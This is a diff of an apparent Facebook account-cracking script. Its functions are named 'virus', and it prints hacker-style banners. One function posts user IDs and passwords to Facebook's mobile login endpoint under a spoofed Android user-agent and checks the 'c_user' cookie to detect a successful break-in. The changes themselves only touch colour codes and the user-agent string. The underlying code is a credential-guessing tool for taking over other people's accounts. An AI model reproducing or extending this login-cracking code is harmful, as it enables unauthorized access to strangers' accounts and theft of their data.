@@ -225,8 +225,7 @@ def x():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		
-		print('[\033[1;32m✓] This massage is for my hatters')
+		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
 		print(50*'_')
@@ -260,7 +259,7 @@ def virus():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[\033[1;32m✓] This massage is for my hatters')
+		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
 		print(50*'_')
@@ -291,7 +290,7 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[\033[1;32m✓] This massage is for my hatters')
+		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
 		print(50*'_')
@@ -322,7 +321,7 @@ def virus3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('[\033[1;32m✓] This massage is for my hatters')
+		print('\033[1;32m[\033[1;32m✓] This massage is for my hatters')
 		print('[\033[1;32m✓]      The FIRE Is Back')
 		print('[\033[1;32m✓] Successfully Update Done 3:2.1')
 		print(50*'_')
@@ -500,7 +499,7 @@ def c(uid,pwx,tl):
             "sec-fetch-site": 'none',
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
-            "user-agent": 'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13'}
+            "user-agent": 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
